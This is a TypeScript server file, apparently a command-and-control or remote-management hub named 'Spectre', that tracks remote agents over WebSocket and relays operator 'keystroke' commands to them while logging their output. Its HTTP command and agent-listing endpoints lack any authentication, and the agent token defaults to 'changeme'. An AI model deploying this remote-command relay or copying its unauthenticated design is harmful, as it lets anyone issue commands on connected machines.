import express from "express";
import { createServer } from "http";
import { WebSocketServer, WebSocket } from "ws";
import { v4 as uuid } from "uuid";
import { AgentMessage, AgentRecord, ServerMessage } from "./types";

const PORT = process.env.PORT ? Number(process.env.PORT) : 8080;
const AUTH_TOKEN = process.env.AGENT_AUTH_TOKEN || "changeme";

const app = express();
app.use(express.json());

const httpServer = createServer(app);
const wss = new WebSocketServer({ server: httpServer, path: "/ws" });

const agents: Map<string, { socket: WebSocket; record: AgentRecord }> = new Map();

const HEARTBEAT_INTERVAL_MS = 30_000;

function now() {
  return Date.now();
}

wss.on("connection", (socket) => {
  let agentId: string | undefined;

  socket.on("message", (data) => {
    try {
      const payload = JSON.parse(data.toString()) as AgentMessage;
      if (payload.type === "hello") {
        if (payload.token !== AUTH_TOKEN) {
          socket.close(4001, "unauthorized");
          return;
        }
        agentId = payload.agentId || uuid();
        const record: AgentRecord = {
          id: agentId,
          status: "connected",
          lastSeen: now(),
          fingerprint: payload.fingerprint,
        };
        agents.set(agentId, { socket, record });
        console.log(`[agent ${agentId}] connected (${payload.fingerprint.hostname})`);
        return;
      }

      if (!agentId) {
        socket.close(4002, "missing handshake");
        return;
      }

      const agentEntry = agents.get(agentId);
      if (!agentEntry) return;
      agentEntry.record.lastSeen = now();

      if (payload.type === "output") {
        console.log(`[agent ${agentId}] output: ${payload.data.substring(0, 120)}`);
      }
    } catch (err) {
      console.error("invalid message", err);
    }
  });

  socket.on("close", () => {
    if (agentId) {
      const existing = agents.get(agentId);
      if (existing) {
        existing.record.status = "disconnected";
        existing.record.lastSeen = now();
        agents.set(agentId, existing);
      }
      console.log(`[agent ${agentId}] disconnected`);
    }
  });
});

function pushToAgent(agentId: string, message: ServerMessage) {
  const entry = agents.get(agentId);
  if (!entry || entry.record.status !== "connected") {
    throw new Error("agent not connected");
  }
  entry.socket.send(JSON.stringify(message));
}

app.get("/agents", (_req, res) => {
  const records = Array.from(agents.values()).map((a) => a.record);
  res.json(records);
});

app.post("/agents/:id/command", (req, res) => {
  const { id } = req.params;
  const { data } = req.body as { data?: string };
  if (!data) {
    return res.status(400).json({ error: "missing data" });
  }
  try {
    pushToAgent(id, { type: "keystroke", data });
    res.json({ status: "sent" });
  } catch (err) {
    res.status(404).json({ error: (err as Error).message });
  }
});

setInterval(() => {
  for (const [id, entry] of agents.entries()) {
    if (entry.record.status !== "connected") continue;
    try {
      entry.socket.send(JSON.stringify({ type: "ping" } satisfies ServerMessage));
    } catch (err) {
      console.warn(`failed to ping agent ${id}`, err);
    }
  }
}, HEARTBEAT_INTERVAL_MS);

httpServer.listen(PORT, () => {
  console.log(`Spectre server listening on :${PORT}`);
});
